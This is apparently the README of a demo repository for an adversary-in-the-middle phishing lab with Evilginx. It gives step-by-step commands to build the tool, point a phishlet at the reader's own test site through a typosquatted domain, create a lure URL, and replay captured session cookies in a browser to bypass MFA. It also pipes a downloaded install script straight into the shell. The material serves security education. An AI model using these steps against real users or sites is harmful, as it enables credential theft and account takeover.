# Introduction

This repository contains the contents to demonstrate an adversary-in-the-middle attack using Evilginx. By following the instructions below, you will gain an understanding of how phishing-as-a-service are able to carry out identity-based attacks at a large scale, bypassing the protections of MFA.

# Prerequisites

To follow along, you must have:
- A domain name and access to a public DNS provider (e.g. Cloudflare)
- An account on any cloud hosting provider (e.g. AWS, Azure)
- A Linux host to run the attack from

# Setup Instructions

## Web Server

The web server hosts the website we are stealing the session and credentials from. In a real attack, this is typically Microsoft 365.

- At your DNS provider, add a public DNS record for the domain you will steal the session from, e.g. `demo.victim.com`.
- Deploy a free-tier Ubuntu VM on your cloud hosting provider. Ensure ports 80 and 443 are open and that the VM has a public IP address. SSH to the VM after it is deployed.
- Run the following commands:

```shell
sudo apt update && sudo apt install git curl
curl https://get.docker.com | sh
git clone https://github.com/hc-nolan/aitm-demo
cd aitm-demo/web
sudo docker compose up -d
```

## Attacker VM

- Ensure git and Golang are installed: `sudo apt install -y git golang-go`
- Run the following commands:

```shell
git clone https://github.com/hc-nolan/aitm-demo
cd aitm-demo
git submodule update --init
cd evilginx2
make
cd ../
```

- Open `demo.yaml` in a text editor (nano, vim, gedit). Change the file according to the domain hosting your web server:

```yaml
proxy_hosts:
  - {
      phish_sub: 'demo',     # subdomain for the phishing URL
      orig_sub: 'demo',      # subdomain for the webapp URL
      domain: 'hnolan.com',  # root domain for the webapp URL
      ...
    }
...
auth_tokens:
  - domain: '.hnolan.com'   # root domain for the webapp URL
...
login:
  domain: 'demo.hnolan.com' # full URL for the webapp
```

- Open `/etc/hosts` in a text editor with `sudo` and add the full phishing URL you intend to use. The subdomain must match the value in `phish_sub` (see above), but the root domain (`hno1an.com` below) can be anything you wish:

```
127.0.0.1 demo.hno1an.com
```
# Attack Instructions

- Start Evilginx

```shell
sudo ./evilginx2/build/evilginx -p ./ --developer
```

- Set the domain and IP address:

```shell
: config domain hno1an.com
: config ipv4 127.0.0.1
: phishlets hostname demo hno1an.com
```

Note that this domain must match the one you added to `/etc/hosts`

- Enable the phishlet, create a lure and get its URL, then unhide the phishlet to make it accessible:

```shell
: phishlets enable demo
: lures create demo
: lures get-url 0
: phishlets unhide demo
```

# Using the captured information

```shell
: sessions
```
Note the number of the session and then rerun 'sessions' with the number after. Copy the output. In a web browser, download the Cookie Editor extension, press the import button, and paste the output from Evilginx.

